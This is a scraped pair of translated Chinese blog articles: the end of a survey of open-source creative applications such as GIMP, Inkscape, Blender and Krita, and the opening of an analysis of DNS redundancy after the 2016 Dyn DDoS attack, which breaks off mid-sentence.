href=\"https://linux.cn/article-7131-1.html\">在 2015 年迎来了它的 20 周岁</a>，使得它成为这里资历最久的开源创造型应用之一。GIMP 是一款强大的应用，可以处理图片，创作简单的绘画，以及插图。你可以通过简单的任务来尝试 GIMP，比如裁剪、缩放图片，然后循序渐进使用它的其它功能。GIMP 可以在 Linux、Mac OS X 以及 Windows 上使用，是一款跨平台的应用，而且能够打开、导出一系列格式的文件，包括在与之相似的软件 Photoshop 上广为应用的那些格式。</p>\n<p>GIMP 开发团队正在忙着 2.10 发行版的工作；<a href=\"https://www.gimp.org/news/2016/07/14/gimp-2-8-18-released/\">2.8.18</a> 是最新的稳定版本。更振奋人心的是非稳定版，<a href=\"https://www.gimp.org/news/2016/07/13/gimp-2-9-4-released/\">2.9.4</a>，拥有全新的用户界面，旨在节省空间的符号式图标和黑色主题，改进了颜色管理，更多的基于 GEGL 的支持分离预览的过滤器，支持 MyPaint 笔刷（如下图所示），对称绘图，以及命令行批次处理。想了解更多信息，请关注 <a href=\"https://www.gimp.org/news/2016/07/13/gimp-2-9-4-released/\">完整的发行版注记</a>。</p>\n<p><img title=\"GIMP 截图\" src=\"http://jbcdn2.b0.upaiyun.com/2017/04/89742fcf1ff88fa0948bf04ae6cc7c4e.png\" alt=\"GIMP 截图\"></p>\n<h3 id=\"toc_3\">Inkscape</h3>\n<p><a href=\"https://opensource.com/tags/inkscape\">Inkscape</a> 是一款富有特色的矢量绘图设计软件。可以用它来创作简单的图形、图表、布局或者图标。</p>\n<p>最新的稳定版是 <a href=\"http://wiki.inkscape.org/wiki/index.php/Release_notes/0.91\">0.91</a> 版本；与 GIMP 相似，能在预发布版 0.92pre3 版本中找到更多有趣的东西，其发布于 2016 年 11 月。最新推出的预发布版的突出特点是<ruby><a href=\"http://wiki.inkscape.org/wiki/index.php/Mesh_Gradients\"> 梯度网格特性</a><rp>（</rp><rt>gradient mesh feature</rt><rp>）</rp></ruby>（如下图所示）；0.91 发行版里介绍的新特性包括：<a href=\"https://www.youtube.com/watch?v=IztyV-Dy4CE\">强力笔触（power stroke）</a> 用于完全可配置的书法笔画（下图的 “opensource.com” 中的 “open” 用的就是强力笔触技术），画布测量工具，以及 <a href=\"https://inkscape.org/cs/%7Edoctormo/%E2%98%85symbols-dialog\">全新的符号对话框</a>（如下图右侧所示）。（很多符号库可以从 GitHub 上获得；<a href=\"https://github.com/Xaviju/inkscape-open-symbols\">Xaviju’s inkscape-open-symbols set</a> 就很不错。）<em>对象</em>对话框是在改进版或每日构建中可用的新特性，整合了一个文档中的所有对象，提供工具来管理这些对象。</p>\n<p><img title=\"Inkscape 截图\" src=\"http://jbcdn2.b0.upaiyun.com/2017/04/02840f2f645d1b27dd2fa284a5fb82f2.png\" alt=\"Inkscape 截图\"></p>\n<h3 id=\"toc_4\">Scribus</h3>\n<p><a href=\"https://opensource.com/tags/scribus\">Scribus</a> 是一款强大的桌面出版和页面布局工具。Scribus 让你能够创造精致美丽的物品，包括信封、书籍、杂志以及其它印刷品。Scribus 的颜色管理工具可以处理和输出 CMYK 格式，还能给文件配色，可靠地用于印刷车间的重印。</p>\n<p><a href=\"https://www.scribus.net/scribus-1-4-6-released/\">1.4.6</a> 是 Scribus 的最新稳定版本；<a href=\"https://www.scribus.net/scribus-1-5-2-released/\">1.5.x</a> 系列的发行版更令人期待，因为它们是即将到来的 1.6.0 发行版的预览。1.5.3 版本包含了 Krita 文件（*.KRA）导入工具； 1.5.x 系列中其它的改进包括了表格工具、文本框对齐、脚注、导出可选 PDF 格式、改进的字典、可驻留边框的调色盘、符号工具，和丰富的文件格式支持。</p>\n<p><img title=\"Scribus 截图\" src=\"http://jbcdn2.b0.upaiyun.com/2017/04/c57b9026d423128a14f775dad19079da.png\" alt=\"Scribus 截图\"></p>\n<h3 id=\"toc_5\">MyPaint</h3>\n<p><a href=\"http://mypaint.org/\">MyPaint</a> 是一款用于数位屏的快速绘图和插画工具。它很轻巧，界面虽小，但快捷键丰富，因此你能够不用放下数位笔而专心于绘图。</p>\n<p><a href=\"http://mypaint.org/blog/2016/01/15/mypaint-1.2.0-released/\">MyPaint 1.2.0</a> 是其最新的稳定版本，包含了一些新特性，诸如 <a href=\"https://github.com/mypaint/mypaint/wiki/v1.2-Inking-Tool\">直观上墨工具</a> 用来跟踪铅笔绘图的轨迹，新的填充工具，层分组，笔刷和颜色的历史面板，用户界面的改进包括暗色主题和小型符号图标，以及可编辑的矢量层。想要尝试 MyPaint 里的最新改进，我建议安装每日构建版的 Flatpak 构建，尽管自从 1.2.0 版本没有添加重要的特性。</p>\n<p><img title=\"MyPaint 截图\" src=\"http://jbcdn2.b0.upaiyun.com/2017/04/e11e63693a586a3bb90e8dddddc4d42d.png\" alt=\"MyPaint 截图\"></p>\n<h3 id=\"toc_6\">Blender</h3>\n<p><a href=\"https://opensource.com/tags/blender\">Blender</a> 最初发布于 1995 年 1 月，像 GIMP 一样，已经有 20 多年的历史了。Blender 是一款功能强大的开源 3D 制作套件，包含建模、雕刻、渲染、真实材质、套索、动画、影像合成、视频编辑、游戏创作以及模拟。</p>\n<p>Blender 最新的稳定版是 <a href=\"http://www.blender.org/features/2-78/\">2.78a</a>。2.78 版本很庞大，包含的特性有：改进的 2D <ruby>蜡笔<rp>（</rp><rt>Grease Pencil</rt><rp>）</rp></ruby> 动画工具；针对球面立体图片的 VR 渲染支持；以及新的手绘曲线的绘图工具。</p>\n<p><img title=\"Inkscape 截图\" src=\"http://jbcdn2.b0.upaiyun.com/2017/04/7f9ceb9eb9eb04cc60acfdb996d689be.png\" alt=\"Inkscape 截图\"></p>\n<p>要尝试最新的 Blender 开发工具，有很多种选择，包括：</p>\n<ul>\n<li>Blender 基金会在官方网址提供 <a href=\"https://builder.blender.org/download/\">非稳定版的每日构建版</a>。</li>\n<li>如果你在寻找特殊的开发中特性，<a href=\"http://graphicall.org/\">graphicall.org</a> 是一个适合社区的网站，能够提供特殊版本的 Blender（偶尔还有其它的创造型开源应用），让艺术家能够尝试体验最新的代码。</li>\n<li>Mathieu Bridon 通过 Flatpak 做了 Blender 的一个开发版本。查看它的博客以了解详情：<a href=\"https://mathieu.daitauha.fr/blog/2016/09/23/blender-nightly-in-flatpak/\">Flatpak 上每日构建版的 Blender</a></li>\n</ul>\n<h3 id=\"toc_7\">Krita</h3>\n<p><a href=\"https://opensource.com/tags/krita\">Krita</a> 是一款拥有强大功能的数字绘图应用。这款应用贴合插画师、印象艺术家以及漫画家的需求，有很多附件，比如笔刷、调色板、图案以及模版。</p>\n<p>最新的稳定版是 <a href=\"https://krita.org/en/item/krita-3-0-1-update-brings-numerous-fixes/\">Krita 3.0.1</a>，于 2016 年 9 月发布。3.0.x 系列的新特性包括 2D 逐帧动画；改进的层管理器和功能；丰富的常用快捷键；改进了网格、向导和图形捕捉；还有软打样。</p>\n<p><img title=\"Krita 截图\" src=\"http://jbcdn2.b0.upaiyun.com/2017/04/0d13f48b1a13c072eba3bad0bc49960c.png\" alt=\"Krita 截图\"></p>\n<h3 id=\"toc_8\">视频处理工具</h3>\n<p>关于开源的视频编辑工具则有很多很多。这这些工具之中，<a href=\"https://opensource.com/life/16/9/10-reasons-flowblade-linux-video-editor\">Flowblade</a> 是新推出的，而 Kdenlive 则是构建完善、对新手友好、功能最全的竞争者。对你排除某些备选品有所帮助的主要标准是它们所支持的平台，其中一些只支持 Linux 平台。它们的软件上游都很活跃，最新的稳定版都于近期发布，发布时间相差不到一周。</p>\n<h3 id=\"toc_9\">Kdenlive</h3>\n<p><a href=\"https://opensource.com/tags/kdenlive\">Kdenlive</a>，最初于 2002 年发布，是一款强大的非线性视频编辑器，有 Linux 和 OS X 版本（但是 OS X 版本已经过时了）。Kdenlive 有用户友好的、基于拖拽的用户界面，适合初学者，又有专业人员需要的深层次功能。</p>\n<p>可以看看 Seth Kenlon 写的 <a href=\"https://opensource.com/life/11/11/introduction-kdenlive\">Kdenlive 系列教程</a>，了解如何使用 Kdenlive。</p>\n<ul>\n<li>最新稳定版: 16.08.2 (2016 年 10 月)</li>\n</ul>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/04/cd7d968fed21cca22e326004e31eb624.png\" alt=\"\"></p>\n<h3 id=\"toc_10\">Flowblade</h3>\n<p>2012 年发布, <a href=\"http://jliljebl.github.io/flowblade/\">Flowblade</a>，只有 Linux 版本的视频编辑器，是个相当不错的后起之秀。</p>\n<ul>\n<li>最新稳定版: 1.8 (2016 年 9 月)</li>\n</ul>\n<h3 id=\"toc_11\">Pitivi</h3>\n<p><a href=\"http://pitivi.org/\">Pitivi</a> 是用户友好型的自由开源视频编辑器。Pitivi 是用 <a href=\"http://wiki.pitivi.org/wiki/Why_Python%3F\">Python</a> 编写的（“Pitivi” 中的 “Pi”来源于此），使用了 <a href=\"https://gstreamer.freedesktop.org/\">GStreamer</a> 多媒体框架，社区活跃。</p>\n<ul>\n<li>最新稳定版: 0.97 (2016 年 8 月)</li>\n<li>通过 Flatpak 获取 <a href=\"https://pitivi.wordpress.com/2016/07/18/get-pitivi-directly-from-us-with-flatpak/\">最新版本</a></li>\n</ul>\n<h3 id=\"toc_12\">Shotcut</h3>\n<p><a href=\"http://shotcut.org/\">Shotcut</a> 是一款自由开源的跨平台视频编辑器，早在 2004 年就发布了，之后由现在的主要开发者 <a href=\"http://www.dennedy.org/\">Dan Dennedy</a> 重写。</p>\n<ul>\n<li>最新稳定版: 16.11 (2016 年 11 月)</li>\n<li>支持 4K 分辨率</li>\n<li>仅以 tar 包方式发布</li>\n</ul>\n<h3 id=\"toc_13\">OpenShot Video Editor</h3>\n<p>始于 2008 年，<a href=\"http://openshot.org/\">OpenShot Video Editor</a> 是一款自由、开源、易于使用、跨平台的视频编辑器。</p>\n<ul>\n<li>最新稳定版: <a href=\"http://www.openshotvideo.com/2016/08/openshot-21-released.html\">2.1</a> (2016 年 8 月)</li>\n</ul>\n<h3 id=\"toc_14\">其它工具</h3>\n<h3 id=\"toc_15\">SwatchBooker</h3>\n<p><a href=\"http://www.selapa.net/swatchbooker/\">SwatchBooker</a> 是一款很方便的工具，尽管它近几年都没有更新了，但它还是很有用。SwatchBooler 能帮助用户从各大制造商那里合法地获取色卡，你可以用其它自由开源的工具处理它导出的格式，包括 Scribus。</p>\n<h3 id=\"toc_16\">GNOME Color Manager</h3>\n<p><a href=\"https://help.gnome.org/users/gnome-help/stable/color.html.en\">GNOME Color Manager</a> 是 GNOME 桌面环境内建的颜色管理器，而 GNOME 是某些 Linux 发行版的默认桌面。这个工具让你能够用色度计为自己的显示设备创建属性文件，还可以为这些设备加载/管理 ICC 颜色属性文件。</p>\n<h3 id=\"toc_17\">GNOME Wacom Control</h3>\n<p><a href=\"https://help.gnome.org/users/gnome-help/stable/wacom.html.en\">The GNOME Wacom controls</a> 允许你在 GNOME 桌面环境中配置自己的 Wacom 手写板；你可以修改手写板交互的很多选项，包括自定义手写板灵敏度，以及手写板映射到哪块屏幕上。</p>\n<h3 id=\"toc_18\">Xournal</h3>\n<p><a href=\"http://xournal.sourceforge.net/\">Xournal</a> 是一款简单但可靠的应用，可以让你通过手写板手写或者在笔记上涂鸦。Xournal 是一款有用的工具，可以让你签名或注解 PDF 文档。</p>\n<h3 id=\"toc_19\">PDF Mod</h3>\n<p><a href=\"https://wiki.gnome.org/Apps/PdfMod\">PDF Mod</a> 是一款编辑 PDF 文件很方便的工具。PDF Mod 让用户可以移除页面、添加页面，将多个 PDF 文档合并成一个单独的 PDF 文件，重新排列页面，旋转页面等。</p>\n<h3 id=\"toc_20\">SparkleShare</h3>\n<p><a href=\"https://www.sparkleshare.org/\">SparkleShare</a> 是一款基于 git 的文件分享工具，艺术家用来协作和分享资源。它会挂载在 GitLab 仓库上，你能够采用一个精妙的开源架构来进行资源管理。SparkleShare 的前端通过在顶部提供一个类似下拉框界面，避免了使用 git 的复杂性。</p>\n<h3 id=\"toc_21\">摄影</h3>\n<h3 id=\"toc_22\">Darktable</h3>\n<p><a href=\"https://opensource.com/life/16/4/how-use-darktable-digital-darkroom\">Darktable</a> 是一款能让你编辑 RAW 文件的应用，有一系列工具，可以管理工作流、无损编辑图片。Darktable 支持许多流行的相机和镜头。</p>\n<p><img title=\"改变颜色平衡度的图片\" src=\"http://jbcdn2.b0.upaiyun.com/2017/04/9c06beeab4a7c81113f508fc845b6a3b.jpg\" alt=\"改变颜色平衡度的图片\"></p>\n<h3 id=\"toc_23\">Entangle</h3>\n<p><a href=\"https://entangle-photo.org/\">Entangle</a> 允许你将数字相机连接到电脑上，让你能从电脑上完全控制相机。</p>\n<h3 id=\"toc_24\">Hugin</h3>\n<p><a href=\"http://hugin.sourceforge.net/\">Hugin</a> 是一款工具，让你可以拼接照片，从而制作全景照片。</p>\n<h3 id=\"toc_25\">2D 动画</h3>\n<h3 id=\"toc_26\">Synfig Studio</h3>\n<p><a href=\"https://opensource.com/article/16/12/synfig-studio-animation-software-tutorial\">Synfig Studio</a> 是基于矢量的二维动画套件，支持位图原图，在平板上用起来方便。</p>\n<h3 id=\"toc_27\">Blender Grease Pencil</h3>\n<p>我在前面讲过了 Blender，但值得注意的是，最近的发行版里<a href=\"https://wiki.blender.org/index.php/Dev:Ref/Release_Notes/2.78/GPencil\">重构的蜡笔特性</a>，添加了创作二维动画的功能。</p>\n<h3 id=\"toc_28\">Krita</h3>\n<p><a href=\"https://opensource.com/tags/krita\">Krita</a> 现在同样提供了二维动画功能。</p>\n<h3 id=\"toc_29\">音频编辑</h3>\n<h3 id=\"toc_30\">Audacity</h3>\n<p><a href=\"https://opensource.com/tags/audacity\">Audacity</a> 在编辑音频文件、记录声音方面很有名，是用户友好型的工具。</p>\n<h3 id=\"toc_31\">Ardour</h3>\n<p><a href=\"https://ardour.org/\">Ardour</a> 是一款数字音频工作软件，界面中间是录音，编辑和混音工作流。使用上它比 Audacity 要稍微难一点，但它允许自动操作，并且更高端。（有 Linux、Mac OS X 和 Windows 版本）</p>\n<h3 id=\"toc_32\">Hydrogen</h3>\n<p><a href=\"http://www.hydrogen-music.org/\">Hydrogen</a> 是一款开源的电子鼓，界面直观。它可以用合成的乐器创作、整理各种乐谱。</p>\n<h3 id=\"toc_33\">Mixxx</h3>\n<p><a href=\"http://mixxx.org/\">Mixxx</a> 是四仓 DJ 套件，让你能够以强大操控来 DJ 和混音歌曲，包含节拍循环、时间延长、音高变化，还可以用 DJ 硬件控制器直播混音和衔接。</p>\n<h3 id=\"toc_34\">Rosegarden</h3>\n<p><a href=\"http://www.rosegardenmusic.com/\">Rosegarden</a> 是一款作曲软件，有乐谱编写和音乐作曲或编辑的功能，提供音频和 MIDI 音序器。（LCTT 译注：MIDI 即 Musical Instrument Digital Interface 乐器数字接口）</p>\n<h3 id=\"toc_35\">MuseScore</h3>\n<p><a href=\"https://opensource.com/life/16/03/musescore-tutorial\">MuseScore</a> 是乐谱创作、记谱和编辑的软件，它还有个乐谱贡献者社区。</p>\n<h3 id=\"toc_36\">其它具有创造力的工具</h3>\n<h3 id=\"toc_37\">MakeHuman</h3>\n<p><a href=\"http://makehuman.org/\">MakeHuman</a> 是一款三维绘图工具，可以创造人型的真实模型。</p>\n<h3 id=\"toc_38\">Natron</h3>\n<p><a href=\"https://natron.fr/\">Natron</a> 是基于节点的合成工具，用于视频后期制作、动态图象和设计特效。</p>\n<h3 id=\"toc_39\">FontForge</h3>\n<p><a href=\"http://fontforge.github.io/en-US/\">FontForge</a> 是创作和编辑字体的工具。允许你编辑某个字体中的字形，也能够使用这些字形生成字体。</p>\n<h3 id=\"toc_40\">Valentina</h3>\n<p><a href=\"http://valentina-project.org/\">Valentina</a> 是用来设计缝纫图案的应用。</p>\n<h3 id=\"toc_41\">Calligra Flow</h3>\n<p><a href=\"https://www.calligra.org/flow/\">Calligra Flow</a> 是一款图表工具，类似 Visio（有 Linux，Mac OS X 和 Windows 版本）。</p>\n<h3 id=\"toc_42\">资源</h3>\n<p>这里有很多小玩意和彩蛋值得尝试。需要一点灵感来探索？这些网站和论坛有很多教程和精美的成品能够激发你开始创作：</p>\n<p>1、 <a href=\"http://pixls.us/\">pixls.us</a>： 摄影师 Pat David 管理的博客，他专注于专业摄影师使用的自由开源的软件和工作流。</p>\n<p>2、 <a href=\"http://davidrevoy.com/\">David Revoy ‘s Blog</a>： David Revoy 的博客，热爱自由开源，非常有天赋的插画师，概念派画师和开源倡议者，对 Blender 基金会电影有很大贡献。</p>\n<p>3、 <a href=\"http://monsterjavaguns.com/podcast/\">The Open Source Creative Podcast</a>: 由 Opensource.com 社区版主和专栏作家 <a href=\"https://opensource.com/users/jason-van-gumster\">Jason van Gumster</a> 管理，他是 Blender 和 GIMP 的专家， <a href=\"http://www.blenderbasics.com/\">《Blender for Dummies》</a> 的作者，该文章正好是面向我们这些热爱开源创作工具和这些工具周边的文化的人。</p>\n<p>4、 <a href=\"http://libregraphicsmeeting.org/2016/\">Libre Graphics Meeting</a>: 自由开源创作软件的开发者和使用这些软件的创作者的年度会议。这是个好地方，你可以通过它找到你喜爱的开源创作软件将会推出哪些有意思的特性，还可以了解到这些软件的用户用它们在做什么。</p>\n<hr>\n<p>作者简介：</p>\n<p>Máirín Duffy – Máirín 是 Red Hat 的首席交互设计师。她热衷于自由软件和开源工具，尤其是在创作领域：她最喜欢的应用是 <a href=\"http://inkscape.org\">Inkscape</a>。</p>\n<p>（题图： <a href=\"https://pixabay.com\">pixabay</a>，CC0）</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111012\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111012votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111012\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/04/89742fcf1ff88fa0948bf04ae6cc7c4e.png"], "fav_nums": 4, "comment_nums": 0, "create_date": "2017/04/26", "praise_nums": 1}
{"tags": " 2 评论 ,安全,IT技术", "front_image_path": "full/1ef0c99044632a162ca37b8246f9136048574deb.jpg", "title": "最大成人网站的安全做得比某些安全公司还要好！", "url_object_id": "829a62e0663548840b8af166c1bcd88a", "url": "http://blog.jobbole.com/111025/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/sunshinebuel\">sunshinebuel</a> 翻译，<a href=\"http://www.jobbole.com/members/huanglimin\">黄利民</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://advancedpersistentsecurity.net/the-security-of-porn/\"> Joe Gray</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><blockquote><p>这篇文章旨在向读者介绍 2016 年下半年发生的 DDoS 攻击事件以及从中得到的教训。以下均是我的个人观点。尽管我已经力争涵盖到各个方面，但是难免有很多疏漏之处，或是出于范围、时间、篇幅及适用性等考量而省略的内容。如果你对本文或其他任何话题有疑问的话，<a href=\"blog@advancedpersistentsecurity.net\" target=\"_blank\">请给我发邮件</a>。</p>\n<p>无论在过去，现在或是将来，本文观点均不代表我雇主的看法。尽管我是个安全专家，但并非你的私人安全顾问。本篇文章所引用的数据都是来自于当前行业的数据，或许并不适用于你。</p></blockquote>\n<h3>引言</h3>\n<p>2016 年 10 月左右发生过几起 DDoS 攻击事件。第一起是 Brian Krebs 遭受的 <strong>620 Gbps</strong> 的 DDoS 攻击。第二起则是更为引人关注的 Dyn（一家 DNS 服务供应商）事件，这次攻击使得 Twitter、Amazon 以及其他东海岸 Dyn 客户的基础设施均受到了不同程度的影响。通过<a href=\"http://dyn.com/blog/dyn-statement-on-10212016-ddos-attack/\" target=\"_blank\">链接</a>可以看到 Dyn 针对此次事件的声明。</p>\n<p>通过深入研究和缜密思考，我由表象发现，P***Hub（我才没有它的链接~）似乎在信息安全方面比一些所谓的“安全”公司做得更好。本文目的就是分析成人网站采取的措施，及它们在整个科技行业中的水平。</p>\n<h2>我的分析</h2>\n<h3>总体看法</h3>\n<p>这对所有组织/公司来说，都是一个教训。P***Hub 作为一个既非安全领域又非科技领域（除了编码和视频输出）的公司，却展现了其在安全领域的专业性。说得更详细一点，它们在 <a href=\"https://hackerone.com/pornhub\" target=\"_blank\">HackerOne </a>网站上有一套文档完善、响应及时的 Bug 悬赏计划。根据 HackerOne 有关政策，P***Hub 会支付给那些发现并报告漏洞的志愿者 $50（非核心的跨站脚本漏洞）至 $15,000（核心的远程脚本及命令执行漏洞）不等的现金奖励。</p>\n<h3>针对 DDoS 的看法</h3>\n<p>在找寻引发美国东海岸及周边地区的 Twitter 及 Amazon 瘫痪的根源时，我们最终发现其背后的元凶貌似是单点故障。当我看到Twitter上的一些评论后，最终按耐不住，决定做一点研究。记得 DDos 攻击事件大概发生于两周前。运行命令行“dig -t NS _____”，空格里对应以下几个网站：</p>\n<h3>NSA.gov</h3>\n<figure id=\"attachment_2325\" class=\"wp-caption aligncenter\"><a href=\"https://i1.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/NSA-Dig.png?ssl=1\"><img class=\"size-full wp-image-2325\" title=\"\" src=\"https://i1.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/NSA-Dig.png?resize=622%2C572&amp;ssl=1\" alt=\"This is the output of running dig on NSA.gov \" width=\"622\" height=\"572\"></a><br>\n<figcaption class=\"wp-caption-text\">这是在 NSA.gov 上执行 dig 操作后的输出结果</figcaption>\n</figure>\n<p>上图显示了 NSA（美国国家安全局）使用了六台不同的 DNS 服务器，它们均属于 Akamai。Akamai 是一家享有盛誉的内容分发网络（CDN）供应商。它提供了一些保护层来避免 DoS 攻击。由于 NSA 是一个极具争议的政府部门，它可能经常遭受 DoS 及其他手段的攻击。<strong>值得注意的是NSA.gov实际上并未与机密系统直接绑定，因此这些攻击本质上更多的是一种政治和象征意义，而非泄漏机密和敏感信息。</strong></p>\n<p>从根本上讲，这种策略有点冗余。NSA 确实拥有很多不同的 DNS 服务器，但是话说回来，它们均来自 Akamai。虽然这个网站对 NSA 的运行来说不是那么关键，但这种做法不宜提倡。如果换作一家电商或是社交媒体，这种做法可能带来灾难性的后果。</p>\n<figure id=\"attachment_2343\" class=\"wp-caption aligncenter\"><a href=\"https://i1.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/NSA-Geo.png?ssl=1\"><img class=\"wp-image-2343 size-full\" title=\"\" src=\"https://i1.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/NSA-Geo.png?resize=788%2C492&amp;ssl=1\" alt=\"NSA.gov Geolocation based on IP\" width=\"788\" height=\"492\"></a><br>\n<figcaption class=\"wp-caption-text\">NSA.gov 基于 IP 的定位</figcaption>\n</figure>\n<p><strong>注：亚特兰大的 pin 是错误的，这是我查询得到的地址而 UI 没有删除那个 pin。</strong></p>\n<p>上图显示了依据 IP 地址定位的 NSA.gov 外部 DNS 服务器分布。这仅仅是依据 IP 地址而未考虑诸如集群及负载均衡等设计方法的定位结果。其中几台主机部署在瑞士，有两台部署在法国，还有一台部署在堪萨斯州。具有讽刺意味的是，NSA 作为一个美国政府部门竟然违反了 FISMA 中禁止美国政府使用境外计算机设备的典型政策条款。有时 FVEY（五眼联盟：美国、英国、加拿大、澳大利亚和新西兰）也会有例外情况。</p>\n<p>这种分布式部署对于故障恢复以及业务的持续发展很有好处。在上述地区同时发生一起足以扰乱整个网络正常运行的攻击事件，其概率极小甚至近乎于 0。<strong>（完全披露：我不是统计学家，所以请不要过分执着于数据的准确性）</strong>如果一台服务器因为 DoS 或 DDoS 攻击而瘫痪，那其他服务器可以马上接替它。尽管 Akamai 在 Brian Krebs 受 DDoS 攻击事件中遇到了麻烦，但我听说这促使他们重新检查自己的基础设施及应对策略，并作出必要的改变。</p>\n<h3>Facebook.com</h3>\n<figure id=\"attachment_2328\" class=\"wp-caption aligncenter\"><a href=\"https://i0.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/Facebook-Dig.png?ssl=1\"><img class=\"size-full wp-image-2328\" title=\"\" src=\"https://i0.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/Facebook-Dig.png?resize=729%2C447&amp;ssl=1\" alt=\"This is the output of running dig on Facebook.com \" width=\"729\" height=\"447\"></a>\n<figcaption class=\"wp-caption-text\">这是在 Facebook.com 上执行 dig 操作后的输出结果</figcaption>\n</figure>\n<p>Facebook 的部署策略很独特。Facebook 摒弃了外包业务而是靠自己来管理他们的外部服务器（很可能采取了一种集群配置）。我起初只搜索了 IPv4 地址。但要注意 IPv6 地址中包含字符串“face:booc”，从这个角度来讲，倘若他们没有采用集群，那这套机制是不够健全的。让我们来进一步观察下它们的位置分布。</p>\n<figure id=\"attachment_2342\" class=\"wp-caption aligncenter\"><a href=\"https://i1.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/Facebook-Geo.png?ssl=1\"><img class=\"size-full wp-image-2342\" title=\"\" src=\"https://i1.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/Facebook-Geo.png?resize=788%2C508&amp;ssl=1\" alt=\"Facebook.com Geolocation based on IP\" width=\"788\" height=\"508\"></a>\n<figcaption class=\"wp-caption-text\">Facebook.com  基于 IP 的定位</figcaption>\n</figure>\n<p><strong>注意：亚特兰大的 pin 是错误的，这是我查询得到的地址而 UI 没有删除那个 pin。</strong></p>\n<p>他们的所有服务器均在加州，这让我非常吃惊。就算洛杉矶同湾区（Facebook 总部所在地）有很长的距离，但依旧不能保证其免受火山、地震、骚乱以及恐怖袭击等不确定事件的影响。当我把 IPv6 加入扫描之后，又确定了曼尼托巴这个地点。</p>\n<p>我想起在 CISSP-ISSMP 训练营时曾学过曼尼托巴是世界上的灾害重建之都。那里的天气稳定且令人厌倦。当然它离加州、纽约、德州等都很远。随着进一步研究，你会在曼尼托巴发现更多的服务器。</p>\n<h3>Twitter.com</h3>\n<figure id=\"attachment_2327\" class=\"wp-caption aligncenter\"><a href=\"https://i0.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/Twitter-Dig.png?ssl=1\"><img class=\"size-full wp-image-2327\" title=\"\" src=\"https://i0.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/Twitter-Dig.png?resize=648%2C598&amp;ssl=1\" alt=\"This is the output of running dig on Twitter.com \" width=\"648\" height=\"598\"></a>\n<figcaption class=\"wp-caption-text\">这是在 Twitter.com 上执行 dig 操作 后的输出结果</figcaption>\n</figure>\n<p>Twitter 曾在 Dyn DDoS 攻击事件中受到影响，导致部分用户下线。我在 Dyn DDoS 攻击事件后进行了调查分析，结果表明他们现在拥有多家 DNS 服务供应商。倘若再次发生攻击事件，这应该能够在一定程度上缓解流量负担。让我们通过 IP 地址再来看下它们的位置分布。</p>\n<figure id=\"attachment_2345\" class=\"wp-caption aligncenter\"><a href=\"https://i0.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/Twitter-Geo.png?ssl=1\"><img class=\"size-full wp-image-2345\" title=\"\" src=\"https://i0.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/Twitter-Geo.png?resize=780%2C510&amp;ssl=1\" alt=\"Tiwtter.com Geolocation based on IP\" width=\"780\" height=\"510\"></a>\n<figcaption class=\"wp-caption-text\">Tiwtter.com  基于 IP 的定位</figcaption>\n</figure>\n<p><strong>注意：亚特兰大的 pin 是错误的，这是我查询得到的地址而 UI 没有删除那个 pin。</strong></p>\n<p>可以看到，Twitter 同样在曼尼托巴部署了服务器。我在 Dyn DDoS 攻击事件后进行了调查分析，结果表明 Twitter 目前正在使用的服务器分布于西雅图，新罕布什尔和曼尼巴托。倘若其冗余方案分配合理，那这种分布还是很棒的。在DDoS 攻击事件发生期间，西海岸的用户未受到任何影响。这源于部署在西雅图的服务器。如今在新罕布什尔也部署有多台服务器，我在攻击之前不能讲太多。</p>\n<h3>P***Hub</h3>\n<figure id=\"attachment_2326\" class=\"wp-caption aligncenter\"><a href=\"https://i0.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/Pornhub-Dig.png?ssl=1\"><img class=\"size-full wp-image-2326\" title=\"\" src=\"https://i0.wp.com/advancedpersistentsecurity.net/wp-content/uploads/2016/11/Pornhub-Dig.png?resize=671%2C632&amp;ssl=1\" alt=\"This is the output of running dig on Pornhub.com \" width=\"671\" height=\"632\"></a>\n<figcaption class=\"wp-caption-text\">这是在 P***Hub 上执行 dig 操作后的输出结果</figcaption>\n</figure>\n<p>P***Hub 